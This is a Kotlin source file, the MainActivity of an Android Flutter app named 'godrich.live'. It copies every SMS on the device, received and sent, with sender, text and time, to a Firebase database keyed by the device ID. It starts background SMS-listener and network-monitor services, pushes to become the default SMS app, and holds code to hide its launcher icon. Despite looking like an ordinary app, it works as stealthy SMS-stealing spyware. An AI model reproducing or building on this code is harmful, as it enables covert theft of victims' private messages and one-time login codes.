package godrich.live

import android.Manifest
import android.annotation.SuppressLint
import android.annotation.TargetApi
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Bundle
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import androidx.annotation.RequiresPermission
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.plugin.common.MethodChannel
import android.provider.Settings
import android.provider.Telephony
import java.sql.Date
import java.text.SimpleDateFormat
import java.util.Locale
import com.google.firebase.database.FirebaseDatabase
import android.os.Build
import android.content.ComponentName
import android.content.Context
import android.content.IntentFilter
import android.util.Log
import io.flutter.plugin.common.EventChannel
import android.os.Handler
import android.os.Looper


class MainActivity : FlutterActivity() {
    private val CHANNEL = "sim_info"
    private val SMS_CHANNEL = "sms_events"
    private val REQ_READ_PHONE_STATE = 1001
    private val REQ_CALL_PHONE = 1002
    private val CHANNELDevice = "godrich.live/device_id"
    private val CHANNEL1 = "godrich.live/sendAll"
    private val APPCONTROL = "godrich.live/app_control"

    companion object {
        private const val EVENT_CHANNEL = "godrich.live/smsStream"
        var eventSink: EventChannel.EventSink? = null
    }


    @TargetApi(Build.VERSION_CODES.KITKAT)
    @SuppressLint("MissingPermission")
    override fun onCreate(savedInstanceState: Bundle?) {


        super.onCreate(savedInstanceState)

        val messenger = flutterEngine!!.dartExecutor.binaryMessenger

//        showBatteryOptimizationDialog()


        com.google.firebase.FirebaseApp.initializeApp(this)
        FirebaseDatabase.getInstance().setPersistenceEnabled(true)

//        uploadOldSms()
        // MethodChannel for SIM info + calling
        MethodChannel(messenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "getSubscriptionIds" -> {
                    if (hasReadPhoneStatePermission()) {
                        val list = getSubscriptionList()
                        result.success(list)
                    } else {
                        ActivityCompat.requestPermissions(
                            this,
                            arrayOf(Manifest.permission.READ_PHONE_STATE),
                            REQ_READ_PHONE_STATE
                        )
                        result.error(
                            "PERMISSION_REQUIRED",
                            "READ_PHONE_STATE permission required",
                            null
                        )
                    }
                }

                "makeCall" -> {
                    val phoneNumber = call.argument<String>("phoneNumber")
                    val simSlot = call.argument<Int>("simSlot") ?: 0
                    if (phoneNumber != null) {
                        if (ContextCompat.checkSelfPermission(
                                this,
                                Manifest.permission.CALL_PHONE
                            ) == PackageManager.PERMISSION_GRANTED
                        ) {
                            makeCallWithSim(phoneNumber, simSlot)
                            result.success("CALL_PLACED")
                        } else {
                            ActivityCompat.requestPermissions(
                                this,
                                arrayOf(Manifest.permission.CALL_PHONE),
                                REQ_CALL_PHONE
                            )
                            result.error(
                                "PERMISSION_REQUIRED",
                                "CALL_PHONE permission required",
                                null
                            )
                        }
                    } else {
                        result.error("INVALID_NUMBER", "Phone number is null", null)
                    }
                }

                else -> result.notImplemented()
            }
        }

        MethodChannel(messenger, CHANNELDevice).setMethodCallHandler { call, result ->
            if (call.method == "getDeviceId") {
                val deviceId =
                    Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                result.success(deviceId)
            } else {
                result.notImplemented()
            }
        }


        MethodChannel(messenger, CHANNEL1).setMethodCallHandler { call, result ->
            when (call.method) {
                "uploadOldSms" -> {
                    uploadOldSms()
                    result.success("Old SMS uploaded")
                }

                else -> result.notImplemented()
            }
        }


        val intent = Intent(this, NetworkMonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }


//        hideAppIcon(this)
//        MethodChannel(messenger, APPCONTROL).setMethodCallHandler { call, result ->
//            when (call.method) {
//                "hideAppIcon" -> {
//                    hideAppIcon(this)
//                    val launchIntent = Intent(this, MainActivity::class.java)
//                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
//                    this.startActivity(launchIntent)
//                }
//                else -> result.notImplemented()
//            }
//        }

//        MethodChannel(messenger, APPCONTROL).setMethodCallHandler { call, result ->
//            when (call.method) {
//                "hideApp" -> {
//                    hideAppFromLauncher()
//                    result.success(null)
//                }
//
//                else -> result.notImplemented()
//            }
//        }


//        val intent = Intent(this, SmsListenerService::class.java)
//        startService(intent)

        val intent1 = Intent(this, SmsListenerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent1)
        } else {
            startService(intent1)
        }


        if (Telephony.Sms.getDefaultSmsPackage(this) != packageName) {
            val intent3 = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
            startActivity(intent3)
        }







//        uploadOldSms()
//        MethodChannel(messenger, CHANNEL1).setMethodCallHandler { call, result ->
//            if (call.method == "startService") {
//                val intent = Intent(this, SmsListenerService::class.java)
//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                    startForegroundService(intent)
//                } else {
//                    startService(intent)
//                }
//                result.success("Service started")
//            } else {
//                result.notImplemented()
//            }
//        }


        // EventChannel for SMS
//        EventChannel(messenger, SMS_CHANNEL).setStreamHandler(
//            object : EventChannel.StreamHandler {
//                override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
//                    SmsReceiver.events = events
//                }
//
//                override fun onCancel(arguments: Any?) {
//                    SmsReceiver.events = null
//                }
//            }
//        )
//        EventChannel(messenger, EVENT_CHANNEL)
//            .setStreamHandler(object : EventChannel.StreamHandler {
//                override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
//                    eventSink = events
//                }
//
//                override fun onCancel(arguments: Any?) {
//                    eventSink = null
//                }
//            })


    }


    override fun onDestroy() {
        super.onDestroy()
        val intent = Intent(this, HideIconReceiver::class.java)
        sendBroadcast(intent)

    }


    private fun hasReadPhoneStatePermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED
    }

    @RequiresPermission(Manifest.permission.READ_PHONE_STATE)
    private fun getSubscriptionList(): List<Map<String, Any?>> {
        val out = mutableListOf<Map<String, Any?>>()
        val subscriptionManager = getSystemService(SubscriptionManager::class.java)
        val activeList: List<SubscriptionInfo>? = subscriptionManager?.activeSubscriptionInfoList
        if (activeList != null) {
            for (info in activeList) {
                val subId = info.subscriptionId
                val carrier = info.carrierName?.toString()
                out.add(
                    mapOf(
                        "subscriptionId" to subId,
                        "carrierName" to carrier,
                        "simSlotIndex" to info.simSlotIndex,
                        "number" to info.number
                    )
                )
            }
        }
        return out
    }

    @SuppressLint("MissingPermission")
    private fun makeCallWithSim(phoneNumber: String, simSlot: Int) {
        val telecomManager = getSystemService(TELECOM_SERVICE) as TelecomManager
        val subscriptionManager = getSystemService(SubscriptionManager::class.java)

        val activeList: List<SubscriptionInfo>? = subscriptionManager?.activeSubscriptionInfoList
        if (activeList != null && simSlot < activeList.size) {
            val subInfo = activeList[simSlot]
            val phoneAccountHandles: List<PhoneAccountHandle> =
                telecomManager.callCapablePhoneAccounts

            val phoneAccountHandle = phoneAccountHandles.find {
                it.id.contains(subInfo.subscriptionId.toString())
            }

            val uri = Uri.fromParts("tel", phoneNumber, null)
            val extras = Bundle()
            if (phoneAccountHandle != null) {
                extras.putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
            }

            telecomManager.placeCall(uri, extras)
        }
    }

//    private fun uploadOldSms() {
//
//        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
//        val database = FirebaseDatabase.getInstance().getReference("messages/$deviceId")
//
//        val uriSms: Uri = Telephony.Sms.Inbox.CONTENT_URI
//        val cursor: Cursor? = contentResolver.query(uriSms, null, null, null, null)
//
//        cursor?.use {
//            var counter = 1L // start from ID = 1
//            while (it.moveToNext()) {
//                val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
//                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
//                val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
//
//                val dateTimeFormat = SimpleDateFormat("dd-MM-yyyy | hh:mm a", Locale.getDefault())
//                val dateTime = dateTimeFormat.format(Date(date))
//
//                val smsData = mapOf(
//                    "dateTime" to dateTime,
//                    "id" to counter,   // old SMS get sequential IDs starting from 1
//                    "message" to body,
//                    "sender" to address,
//                    "type" to "incoming"
//                )
//
//                database.child(counter.toString()).setValue(smsData)
//                counter++
//            }
//        }
//    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    private fun uploadOldSms() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val database = FirebaseDatabase.getInstance().getReference("messages/$deviceId")

        // Query all SMS (inbox + sent)
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI, // fetch all SMS types
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            null,
            null,
            Telephony.Sms.DATE + " ASC" // oldest first (optional)
        )

        cursor?.use {
            var counter = 1L
            val dateTimeFormat = SimpleDateFormat("dd-MM-yyyy | hh:mm a", Locale.getDefault())

            while (it.moveToNext()) {
                val address =
                    it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown"
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))

                val messageType = when (type) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "incoming"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "outgoing"
                    else -> "other"
                }

                val dateTime = dateTimeFormat.format(Date(date))

                val smsData = mapOf(
                    "dateTime" to dateTime,
                    "id" to counter,
                    "message" to body,
                    "sender" to address,
                    "type" to messageType
                )

                database.child(counter.toString()).setValue(smsData)
                counter++
            }
        }
    }


//    fun showBatteryOptimizationDialog() {
//        AlertDialog.Builder(this)
//            .setTitle("Battery Optimization")
//            .setMessage("To make sure SMS service works reliably, please remove this app from battery optimization.")
//            .setPositiveButton("Open Settings") { dialog, which ->
//                // Only if user agrees, open battery settings
//                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
//                startActivity(intent)
//            }
//            .setCancelable(false)
////            .setNegativeButton("Cancel", null)
//            .show()
//    }
}
